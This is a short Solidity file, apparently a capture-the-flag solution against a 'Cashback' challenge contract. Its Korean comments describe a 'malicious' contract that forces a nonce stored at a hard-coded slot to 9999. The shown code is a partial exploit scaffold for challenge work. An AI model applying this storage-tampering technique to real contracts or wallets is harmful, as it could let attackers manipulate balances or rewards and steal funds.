// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Cashback, Currency, CurrencyLibrary} from "./Cashback.sol";

// 1. nonce 조작용 악성 컨트랙트
contract NonceManipulator {
    // Cashback의 nonce storage slot (layout at + 3)
    bytes32 constant NONCE_SLOT = 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03;
    
    function setNonce() external {
        assembly {
            sstore(NONCE_SLOT, 9999) // 0x270f - 다음 호출시 10000 도달
        }
    }
    
    // 디버깅용 읽기 함수
    function getNonce() external view returns (uint256 n) {
        assembly {
            n := sload(NONCE_SLOT)
        }
    }
}

contract Solve {
    Cashback public immutable cashback;
    NonceManipulator public immutable manipulator;
    
    constructor(Cashback _cashback) {
        cashback = _cashback;
        manipulator = new NonceManipulator();
    }
    
    function getManipulatorAddress() external view returns (address) {
        return address(manipulator);
    }
}